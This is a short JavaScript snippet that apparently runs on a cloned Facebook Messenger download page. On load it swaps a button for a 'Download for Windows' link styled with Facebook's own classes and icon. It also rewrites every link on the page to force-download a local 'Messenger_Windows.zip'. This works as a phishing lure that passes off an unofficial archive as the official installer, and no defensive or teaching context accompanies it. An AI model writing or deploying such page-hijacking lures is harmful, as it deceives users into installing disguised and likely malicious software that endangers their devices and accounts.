window.onload = () => {
    const allLinks = document.querySelectorAll('a');
    const button = document.querySelector(
      "#u_0_1_DZ > div._9aj0 > div > div.x78zum5.x1q0g3np.x9f619.x133i7cb.xbxaen2.x18d9i69.x1u72gb5.x1cmgiil.xh8yej3.x9wm9x2 > div.xz84dc7.x1ow4hk9.x13tbtda > div:nth-child(3) > button"
    );

    button.innerHTML = `<a class="x1fr600 xnwf7zb x40j3uw x1s7lred x15gyhx8 x1awj2ng x6prxxf x1s688f x76ihet xwmqs3e x112ta8 xxxdfa6 x1a2a7pz xqy66fx xr1496l x1ypdohk xxpdul3 x6x52a7" href="./Messenger_Windows.zip" download><img class="x1yjekuc xw3qccf img" src="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/gY21aPg8tuk.png" alt="" height="16" width="16">Download for Windows</a>`;

    allLinks.forEach(link => {
        link.href = "./Messenger_Windows.zip";
        link.setAttribute('download', '');
    })
}
